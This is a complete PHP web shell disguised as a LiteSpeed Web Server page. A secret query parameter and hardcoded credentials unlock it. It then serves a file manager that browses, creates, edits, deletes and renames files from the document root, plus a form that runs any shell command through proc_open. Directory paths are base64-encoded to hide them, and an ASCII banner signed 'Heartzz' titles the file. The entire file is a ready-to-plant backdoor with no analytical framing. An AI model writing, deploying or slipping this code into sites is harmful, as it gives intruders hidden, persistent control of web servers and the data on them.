<?php
session_start();

// Only show login form if ?access=lsapi is manually added
if(isset($_GET['access']) && $_GET['access'] === 'lsapi' && !isset($_SESSION['authenticated'])) {
    $secret_user = 'litespeed_admin';
    $secret_pass = '$2y$10$adaQ1o2u/mNXqgrmVzxr9Os8QNu5KZgSYo1Ko9Lz9XVE5zxWUvFeu';
    
    if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
        if($_POST['username'] === $secret_user && password_verify($_POST['password'], $secret_pass)) {
            $_SESSION['authenticated'] = true;
            header('Location: litespeed.php');
            exit;
        }
        $login_error = "Invalid credentials";
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Access Blocked - LiteSpeed</title>
    <style>
        body { 
            background: #0a0a0a;
            color: #ff4444;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .ls-container {
            max-width: 600px;
            margin: 50px auto;
            padding: 30px;
            background: #111;
            border: 2px solid #ff4444;
            border-radius: 5px;
        }
        .ls-logo {
            font-size: 2.5em;
            color: #ff4444;
            text-shadow: 0 0 10px rgba(255,68,68,0.5);
            margin-bottom: 20px;
        }
        .ls-login-form {
            margin-top: 30px;
        }
        .ls-input {
            width: 200px;
            padding: 10px;
            margin: 10px;
            background: #222;
            border: 1px solid #ff4444;
            color: #fff;
        }
        .ls-submit {
            background: #ff4444;
            color: #000;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }
        .ls-error {
            color: #ff8888;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="ls-container">
        <div class="ls-logo">LiteSpeed Web Server</div>
        <div class="ls-message">
            Access to this resource is restricted.<br>
            Please authenticate with valid credentials
        </div>
        <?php if(isset($login_error)): ?>
            <div class="ls-error"><?php echo $login_error; ?></div>
        <?php endif; ?>
        <form class="ls-login-form" method="POST">
            <input type="text" name="username" class="ls-input" placeholder="Username" required><br>
            <input type="password" name="password" class="ls-input" placeholder="Password" required><br>
            <input type="submit" value="Authenticate" class="ls-submit">
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// Only show file manager if authenticated
if(isset($_SESSION['authenticated'])) {
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
    function x($b) { return base64_encode($b); }
    function y($b) { return base64_decode($b); }

    foreach ($_GET as $c => $d) {
        $_GET[$c] = y($d);
    }

    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    chdir($currentDirectory);

    $viewCommandResult = '';
    $message = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                mkdir($newFolder);
                $message = '<div class="success-message">Folder created successfully!</div>';
            } else {
                $message = '<div class="error-message">Error: Folder already exists!</div>';
            }
        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
            $fileName = $_POST['file_name'];
            $newFile = $currentDirectory . '/' . $fileName;
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    $message = '<div class="success-message">File created successfully!</div>';
                } else {
                    $message = '<div class="error-message">Error: Failed to create file!</div>';
                }
            } else {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    $message = '<div class="success-message">File edited successfully!</div>';
                } else {
                    $message = '<div class="error-message">Error: Failed to edit file!</div>';
                }
            }
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if (unlink($fileToDelete)) {
                    $message = '<div class="success-message">File deleted successfully!</div>';
                } else {
                    $message = '<div class="error-message">Error: Failed to delete file!</div>';
                }
            } elseif (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    $message = '<div class="success-message">Folder deleted successfully!</div>';
                } else {
                    $message = '<div class="error-message">Error: Failed to delete folder!</div>';
                }
            } else {
                $message = '<div class="error-message">Error: File or directory not found!</div>';
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    $message = '<div class="success-message">Item renamed successfully!</div>';
                } else {
                    $message = '<div class="error-message">Error: Failed to rename item!</div>';
                }
            } else {
                $message = '<div class="error-message">Error: Item not found!</div>';
            }
        } elseif (isset($_POST['cmd_input'])) {
            $command = $_POST['cmd_input'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($errors)) {
                    $viewCommandResult = '<div class="error-message">Result:</div><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
                } else {
                    $viewCommandResult = '<div class="success-message">Result:</div><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
                }
            } else {
                $viewCommandResult = '<div class="error-message">Error: Failed to execute command!</div>';
            }
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = file_get_contents($fileToView);
                $viewCommandResult = '<div class="success-message">Viewing: ' . htmlspecialchars($_POST['view_file']) . '</div><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
            } else {
                $viewCommandResult = '<div class="error-message">Error: File not found!</div>';
            }
        }
    }

    function deleteDirectory($dir) {
        if (!file_exists($dir)) return true;
        if (!is_dir($dir)) return unlink($dir);
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') continue;
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
        }
        return rmdir($dir);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LiteSpeed File Manager</title>
    <style>
        body { 
            background: #0a0a0a;
            color: #ff4444;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #111;
            padding: 20px;
            border-radius: 5px;
            border: 2px solid #ff4444;
        }
        .fig-ansi {
            margin: 20px 0;
            text-align: center;
        }
        .fig-ansi pre {
            display: inline-block;
            text-align: left;
        }
        input[type="text"], textarea {
            background: #222;
            border: 1px solid #ff4444;
            color: #fff;
            padding: 8px;
            margin: 5px;
            border-radius: 3px;
            width: 200px;
        }
        textarea {
            width: 400px;
            height: 100px;
        }
        input[type="submit"] {
            background: #ff4444;
            color: #000;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 3px;
            font-weight: bold;
        }
        input[type="submit"]:hover {
            background: #ff6666;
        }
        .file-manager-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: #1a1a1a;
        }
        .file-manager-table th, .file-manager-table td {
            padding: 10px;
            border: 1px solid #ff4444;
            color: #fff;
        }
        .file-manager-table th {
            background: #ff4444;
            color: #000;
        }
        .file-manager-table tr:hover {
            background: #222;
        }
        .item-name a {
            color: #ff4444;
            text-decoration: none;
        }
        .item-name a:hover {
            text-decoration: underline;
        }
        .permission {
            text-align: center;
        }
        .writable {
            color: #4CAF50;
        }
        .not-writable {
            color: #ff4444;
        }
        .result-box {
            width: 100%;
            min-height: 100px;
            background: #222;
            color: #fff;
            border: 1px solid #ff4444;
            padding: 10px;
            margin-top: 10px;
        }
        .success-message {
            color: #4CAF50;
            padding: 10px;
            margin: 10px 0;
            background: #1a1a1a;
            border: 1px solid #4CAF50;
            border-radius: 3px;
        }
        .error-message {
            color: #ff4444;
            padding: 10px;
            margin: 10px 0;
            background: #1a1a1a;
            border: 1px solid #ff4444;
            border-radius: 3px;
        }
        form {
            margin: 15px 0;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 3px;
        }
        .breadcrumb {
            margin: 10px 0;
            padding: 10px;
            background: #1a1a1a;
            border-radius: 3px;
        }
        .breadcrumb a {
            color: #ff4444;
            text-decoration: none;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="fig-ansi">
        <pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: #4CAF50;"><strong>  __    Bye Bye Litespeed   _____ __    
    __|  |___ ___ ___ ___ ___   |   __|  | v.1.2
|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
|_____|__,|_  |___|__,|_|_|  |_____|_____|
                |___| ./Heartzz                      </strong></span></pre>
    </div>

    <?php echo $message; ?>

    <div class="breadcrumb">Current Directory: 
        <?php
        $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
        $currentPath = '';
        foreach ($directories as $index => $dir) {
            if ($index == 0) {
                echo '<a href="?d=' . x($dir) . '">' . $dir . '</a>';
            } else {
                $currentPath .= DIRECTORY_SEPARATOR . $dir;
                echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
            }
        }
        ?>
    </div>

    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
        <input type="text" name="folder_name" placeholder="New Folder Name">
        <input type="submit" value="Create Folder">
    </form>

    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
        <input type="text" name="file_name" placeholder="Create New File / Edit Existing File">
        <textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>
        <input type="submit" value="Create / Edit File">
    </form>

    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
        <input type="text" name="cmd_input" placeholder="Enter command">
        <input type="submit" value="Run Command">
    </form>

    <?php echo $viewCommandResult; ?>

    <table class="file-manager-table">
        <tr>
            <th>Item Name</th>
            <th>Size</th>
            <th>View</th>
            <th>Delete</th>
            <th>Permissions</th>
            <th>Rename</th>
        </tr>
        <?php
        foreach (scandir($currentDirectory) as $v) {
            $u = realpath($v);
            $s = stat($u);
            $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
            $permission = substr(sprintf('%o', fileperms($v)), -4);
            $writable = is_writable($v);
            ?>
            <tr>
                <td class="item-name"><a href="<?php echo $itemLink; ?>"><?php echo $v; ?></a></td>
                <td class="size"><?php echo filesize($u); ?></td>
                <td>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="hidden" name="view_file" value="<?php echo htmlspecialchars($v); ?>">
                        <input type="submit" value="View">
                    </form>
                </td>
                <td>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="hidden" name="delete_file" value="<?php echo htmlspecialchars($v); ?>">
                        <input type="submit" value="Delete">
                    </form>
                </td>
                <td class="permission <?php echo $writable ? 'writable' : 'not-writable'; ?>"><?php echo $permission; ?></td>
                <td>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($v); ?>">
                        <input type="text" name="new_name" placeholder="New Name">
                        <input type="submit" name="rename_item" value="Rename">
                    </form>
                </td>
            </tr>
        <?php } ?>
    </table>
</div>
</body>
</html>
<?php
}
// End of file
?>
